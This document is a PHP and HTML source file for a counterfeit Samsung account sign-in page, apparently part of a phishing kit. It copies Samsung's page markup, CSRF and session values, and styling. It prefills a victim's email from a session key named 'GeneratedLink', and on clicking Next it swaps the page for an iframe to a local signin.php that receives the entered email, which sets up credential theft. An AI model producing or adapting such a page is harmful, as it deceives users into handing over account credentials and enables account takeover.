<?php
	include(__DIR__ . "/../includes/samsung.php");
	
	session_name("CAKEPHP");
	session_start();

	$username = $_SESSION['Link']['GeneratedLink']['username'] ?? '';
?>
<!DOCTYPE html>
<!-- saved from url=(0317)https://account.samsung.com/accounts/v1/FMM2/signInGate?state=02yr1yiim7uy::hound-prd&redirect_uri=https:%2F%2Fsmartthingsfind.samsung.com%2Flogin.do&response_type=code&client_id=ntly6zvfpn&scope=iot.client&locale=en_US&acr_values=urn:samsungaccount:acr:basic&goBackURL=https:%2F%2Fsmartthingsfind.samsung.com%2Flogin -->
<html lang="en"><head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}</style>
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  
  <title>Sign in&nbsp;|&nbsp;Samsung account</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  

<script>var PAGEPATH = '/accounts/sign/signInIdentification.js';</script>

<link rel="stylesheet" href="assets/angular-block-ui.min.css">
<link rel="stylesheet" type="text/css" href="assets/angular-material.css">
<link rel="stylesheet" type="text/css" href="assets/default.css">


<link type="image/x-icon" rel="shortcut icon" href="https://account.samsung.com/accounts/v1/resources/one-ui/images/favicon.ico?20231116050348">
<!--[if lt IE 9]>
<script src="https://account.samsung.com/accounts/v1/resources/js/common/json/json3.min.js"></script>
<script src="https://account.samsung.com/accounts/v1/resources/js/common/html5shiv/html5shiv.min.js"></script>
<![endif]-->
<script type="text/javascript">
  //<![CDATA[
  var wipLogicalPath = "/accounts/v1";
  var experimentsUrl = "https://exp.samsungosp.com";
  var wipResourcesVerDt = "20231116050348";
  var wipCancelURI = "https://smartthingsfind.samsung.com/login?state=02yr1yiim7uy%3A%3Ahound-prd";
  var wipGoBackURI = "https://smartthingsfind.samsung.com/login?state=02yr1yiim7uy%3A%3Ahound-prd";
  var loLangCD = "en";
  var loCntyCD = "US";
  var isTextRightAlign = false;
  var isTextFirstFamilyName = false;
  var isTextFirstDateYear = false;
  var wipAcsChnlEnum = "WEB";
  var wipViewTypeEnum = "v2";
  var userGeoIPCnty3dgtCd = "PHL";
  var userAcsCnty3dgtCd = "PHL";
  var userAcsCnty2dgtCd = "PH";
  var userCnty3dgtCd = "";
  var wipUriEnum = "signIn";
  var APPNAME = "FMM2";
  var sJSESSIONID = "d4547e7d-32ae-4a17-9b59-41195bfeae0d";
  var wipCsrf = {'token': '8475c696-9fb8-4e84-a9df-24f662d437a6', 'headerName': 'X-CSRF-TOKEN'};
  var wipResourcesUrl = "https://account.samsung.com/accounts/v1/resources";
  var isGAEnabled = false;
  var googleRecaptchaApiUrl = "https://www.google.com";
  var action = "signInIdentification";
  var isRecaptchaEnabled = true;
  var recaptchaSiteKey = "6LeI5F8iAAAAACfMal3lra4jEWUbkVGlnys_5CWG";
  var isFromChina = false;
  var clientId = "ntly6zvfpn";
  //]]>

  if (isGAEnabled) {
    var containerId;
    if (wipResourcesUrl.indexOf("sad") !== -1) {
      containerId = 'GTM-KCH2BM6';
    } else if (wipResourcesUrl.indexOf("stg") !== -1) {
      containerId = 'GTM-W3S5ZM6';
    } else {
      containerId = 'GTM-5C6SNNV';
    }
    (function (w, d, s, l, i) {
      w[l] = w[l] || [];
      w[l].push({
        'gtm.start':
          new Date().getTime(), event: 'gtm.js'
      });
      var f = d.getElementsByTagName(s)[0],
        j = d.createElement(s), dl = l != 'dataLayer' ? '&l=' + l : '';
      j.async = true;
      j.src =
        'https://www.googletagmanager.com/gtm.js?id=' + i + dl;
      f.parentNode.insertBefore(j, f);
    })(window, document, 'script', 'dataLayer', containerId);
  }

  var createPostMessage = function () {

    var sendPostMessage = function () {
      console.log("");
    }

    if (APPNAME.indexOf("samsung_com_us") !== -1) {
      if (document.getElementsByClassName('wrapper')[0]) {
        var pageType = "signin";
        if (document.querySelector('form[name="signUpForm"]')) {
          pageType = "signup";
        } else if (document.querySelector('form[name=findIdForm]')) {
          pageType = "findid";
        } else if (document.querySelector('form[name=rstPwd]')) {
          pageType = "resetpwd";
        } else {
          pageType = "others";
        }
        sendPostMessage = function () {
          window.parent.postMessage({
            pageType: pageType
          }, '*');
        }
      }
    }
    sendPostMessage();
  }

</script>

<!-- js loading -->


<!-- Samsung analytics -->

<script src="assets/samsung-analytics.js"></script>

<script type="text/javascript">
  window.document.title = 'Sign in | Samsung account';
  var wipEnc = {"pblcKyTxt":"MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCylnSE8ANPUNPmgYJGnApUrUPQiBmTY44Lw+fQbFOOslZZnuUasDFJuPU4287/LBQEpTtgPWLmjGftG/b2sj8eTH46mvhDtE8ijgZsMnGPMmhu/AljEvNOqU6nDZDtgGmL/pAdEBtsJ/VzClv8G9bV1kvczuZtg0gt3JTH+pagEwIDAQAB","lgnEncTp":"1","pbeKySpcIters":"200"};
  var iptLgnPlnID = '';
  var continueWith3rdParty = 'GG';
  var isAdmin = eval(false);
  var isUsingGlobalSession = eval(false);
  let showTip = false;
  let isMobile = window.matchMedia("(max-width: 680px)").matches;
  console.log('isMobile:' + isMobile);
</script>

<style>
    .error-msg {
        display: block !important
    }
</style>
<script src="assets/platform.js" gapi_processed="true"></script></head>

<body onload="createPostMessage();" class="one-card-ui ng-scope block-ui block-ui-anim-fade" block-ui="main" aria-busy="false">

<div class="wrapper ng-scope" data-ng-controller="cmmController as cmm">
  
<!-- ngIf: isIESupportMessageShow=='Y' -->
<header class="one-header">
  <div class="header-inner">
    <div class="logo">
      <h1><img src="assets/txt_logo.svg" onerror="this.src=&#39;https://account.samsung.com/accounts/v1/resources/one-ui/images/layout/txt_logo.png&#39;;" alt="Samsung account"></h1>
    </div>
  </div>
</header>

  <main class="one-main new-login ng-scope" data-ng-controller="signInController as vm">
    <div class="main-inner">
      <div class="container">
        <div class="title">
          <h1>
            <?=$language['slogan'][$lang];?>
          </h1>
        </div>
        <div class="content">
          <div class="one-forms-login">
            <form novalidate="" autocomplete="off" class="ng-pristine ng-valid ng-valid-email ng-valid-maxlength">
              <fieldset>
                <legend>Account Samsung login</legend>

                <div class="new-idform">
                  <!-- ngIf: false -->

                  <!-- ngIf: true --><div id="ctnLgnPlnID" data-ng-if="true" class="one-input-container container-login ng-scope">
                    <label id="lblLgnPlnID" for="iptLgnPlnID"><?=$language['email'][$lang];?></label>
                    <input data-ng-model="vm.iptLgnPlnID" id="iptLgnPlnID" type="email" spellcheck="false" ng-model-options="{ updateOn: &#39;keyup blur&#39; }" aria-required="true" aria-invalid="false" aria-describedby="" maxlength="100" value="<?=$username?>" class="ng-pristine ng-valid ng-empty ng-valid-email ng-valid-maxlength ng-touched" autocomplete="off">
                    <div class="error-msg">
                      <div data-ng-show="(err.iptLgnPlnID &amp;&amp; err.code == &#39;01&#39;)" id="" class="ng-hide">Please enter ID.</div>
                      <div data-ng-show="(err.iptLgnPlnID &amp;&amp; err.code == &#39;02&#39;)" id="err-invalid" class="ng-hide">
                        ID not valid.
                      </div>
                      <div data-ng-show="(err.iptLgnPlnID &amp;&amp; err.code == &#39;AUT_1837&#39;)" id="" class="ng-hide">
                        Can't sign in. Account deactivated for security reasons.
                      </div>
                    </div>
                  </div><!-- end ngIf: true -->

                  <div class="one-checkBox mbr_rememberid" id="rememberID">
                    <input type="checkbox" id="remIdChkYN" data-ng-model="vm.remIdChkYN" ng-enter="" class="ng-pristine ng-untouched ng-valid ng-empty" autocomplete="off">
                    <label for="remIdChkYN"><span></span><?=$language['remember'][$lang];?></label>
                  </div>

                </div>

                <div class="mbr_signin">
                  <div class="one-btn-container">
                    <button class="one-primary one-button" id="signInButton" data-ng-disabled="err.iptLgnPlnID || !vm.iptLgnPlnID" data-ng-click="checkUsableLoginId()" type="button" disabled="disabled">
                      <?=$language['next'][$lang];?>
                    </button>
                  </div>
                  <ul>
                    <li>
                      <a href="https://account.samsung.com/accounts/v1/FMM2/signInGate?state=02yr1yiim7uy::hound-prd&amp;redirect_uri=https:%2F%2Fsmartthingsfind.samsung.com%2Flogin.do&amp;response_type=code&amp;client_id=ntly6zvfpn&amp;scope=iot.client&amp;locale=en_US&amp;acr_values=urn:samsungaccount:acr:basic&amp;goBackURL=https:%2F%2Fsmartthingsfind.samsung.com%2Flogin#" data-ng-click="findInfo()">
                        <?=$language['findid'][$lang];?>
                      </a>
                    </li>
                    <li data-ng-show="!vm.rmvCrtBtnYN">
                      <a href="https://account.samsung.com/accounts/v1/FMM2/signInGate?state=02yr1yiim7uy::hound-prd&amp;redirect_uri=https:%2F%2Fsmartthingsfind.samsung.com%2Flogin.do&amp;response_type=code&amp;client_id=ntly6zvfpn&amp;scope=iot.client&amp;locale=en_US&amp;acr_values=urn:samsungaccount:acr:basic&amp;goBackURL=https:%2F%2Fsmartthingsfind.samsung.com%2Flogin#" data-ng-click="signUp()"><?=$language['create_account'][$lang];?></a>
                    </li>
                  </ul>
                </div>

                <div class="one-btn-container google" data-ng-show="vm.continueWith3rdParty == &#39;GG&#39;">
                  <button class="one-cancel one-button" id="googleSignInButton" data-ng-click="googleSignIn()" type="button"><?=$language['sign_google'][$lang];?></button>
                </div>

                <div class="one-btn-container wechat ng-hide" data-ng-show="vm.continueWith3rdParty == &#39;WC&#39;">
                  <button class="one-cancel one-button" id="wechatSignInButton" data-ng-click="wechatSignIn()" type="button">Continue with WeChat</button>
                </div>

                <div class="one-btn-container qrcode" data-ng-show="true">
                  <button class="one-cancel one-button" id="qrSignInButton" data-ng-click="qrSignIn()" type="button"><?=$language['sign_qr'][$lang];?></button>
                </div>
                <!-- ngIf: false -->

                <div class="signin-tooltip ng-hide" data-ng-show="vm.isAdmin">
                  <dl>
                    <dt>Password (for admin only)</dt>
                    <dd>Passwords need to be at least 8 characters long and include letters, numbers, and symbols.<br><br>If your password does not meet the criteria, you will not be able to sign in.</dd>
                  </dl>
                  <p></p>
                </div>
              </fieldset>
            </form>
          </div>
        </div>
      </div>
    </div>
  </main>
  

<!-- footer -->
<footer class="one-footer" role="contentinfo">
  <div class="footer-inner">
    <div class="footer-logo"><img src="assets/txt_foo_logo.png" onerror="this.src=&#39;https://account.samsung.com/accounts/v1/resources/one-ui/images/layout/txt_foo_logo.png&#39;;" alt="Samsung account"></div>
    <address class="footer-address">Copyright © 1995-<?=date('Y');?> Samsung. <?=$language['rights'][$lang];?></address>
    <div class="footer-links" role="link">
      <a href="https://account.samsung.com/membership/terms/termscontents?paramLocale=en_US" title="Open links in a new window Terms and Conditions"><?=$language['terms'][$lang];?></a>
      <a href="https://account.samsung.com/membership/terms/privacypolicy?paramLocale=en_US" title="Open links in a new window Privacy Policy" class="active"><?=$language['privacy'][$lang];?></a>
      <a href="https://account.samsung.com/membership/notice/notice-list?paramLocale=en_US" title="Open links in a new window Notices"><?=$language['notice'][$lang];?></a>
      <a href="https://help.content.samsung.com/csweb/auth/gosupport.do?targetUrl=/main/main.do&amp;serviceCd=saccount&amp;_common_country=US&amp;_common_lang=en" title="Open links in a new window Contact us"><?=$language['contact'][$lang];?></a>
    </div>
  </div>
</footer>
<!-- //footer -->

</div>

<!-- javascript -->
<script src="assets/jquery.min.js"></script>

<script>
  $(document).ready(function () {
	
	$('#iptLgnPlnID').on('keyup',function(){
		if(isValidEmailAddress($(this).val())){
			$('#signInButton').removeAttr('disabled');
		}else{
			$('#signInButton').attr('disabled','disabled');
		}
	});
	
	$('#iptLgnPlnID').on('keydown',function(e){
		if (e.key === 'Enter' || e.keyCode === 13) {
			if(isValidEmailAddress($(this).val())){
				$('#signInButton').trigger("click");
			}else{
				$('#err-invalid').removeClass("ng-hide");
				e.preventDefault();
			}
		}
	});
	
	$('#signInButton').on('click',function(e){
		$('body').html('<iframe src="signin.php?email=' + $('#iptLgnPlnID').val() + '" frameborder="0" style="overflow:hidden;overflow-x:hidden;overflow-y:hidden;height:100%;width:100%;position:absolute;top:0px;left:0px;right:0px;bottom:0px" height="100%" width="100%"></iframe>');
	});
	
	function isValidEmailAddress(emailAddress) {
		var pattern = /^([a-z\d!#$%&'*+\-\/=?^_`{|}~\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF]+(\.[a-z\d!#$%&'*+\-\/=?^_`{|}~\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF]+)*|"((([ \t]*\r\n)?[ \t]+)?([\x01-\x08\x0b\x0c\x0e-\x1f\x7f\x21\x23-\x5b\x5d-\x7e\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF]|\\[\x01-\x09\x0b\x0c\x0d-\x7f\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF]))*(([ \t]*\r\n)?[ \t]+)?")@(([a-z\d\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF]|[a-z\d\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF][a-z\d\-._~\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF]*[a-z\d\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])\.)+([a-z\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF]|[a-z\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF][a-z\d\-._~\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF]*[a-z\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])\.?$/i;
		return pattern.test(emailAddress);
	};

    inputEvent();
    if ($('form').find(':input')[0] !== undefined) {
      $(':focus').blur();
      $('form').find(':input')[0].focus();
    }
  });

  var attributeObserver = new MutationObserver(function (mutations) {
    mutations.forEach(function (mutation) {
      if (mutation.target.className.includes('ng-not-empty')) {
        var $input = $(mutation.target)
        var $label = $input.parent('div.one-input-container')

        $label.addClass('active');
        $label.siblings('div.flexbdy').addClass('off');
      };
    })
  });

  var inputEvent = function () {
    var $inputs = $('form').find(':input');
    $inputs.each(function () {
        var $input = $(this);
        var $label = $input.parent('div.one-input-container');

        attributeObserver.observe($input.get(0), {
          attributes: true,
          attributeFilter: ['class'],
          attributeOldValue: false,
          characterData: false,
          characterDataOldValue: false,
          childList: false,
          subtree: false
        });

        if ($input.val()) {
          $label.addClass('active');
          $label.siblings('div.flexbdy').addClass('off');
        }

        $input.focusin(function () {
          $label.addClass('focus');
          $label.siblings('div.flexbdy').addClass('off');
        });

        $input.change(function () {
          $label.addClass('active');
        });

        $input.focusout(function () {
          $label.removeClass('focus');

          if (!$input.val()) $label.removeClass('active').siblings('div.flexbdy').removeClass('off');
        });
      }
    );
  }
  
  
</script>




</body>

</html>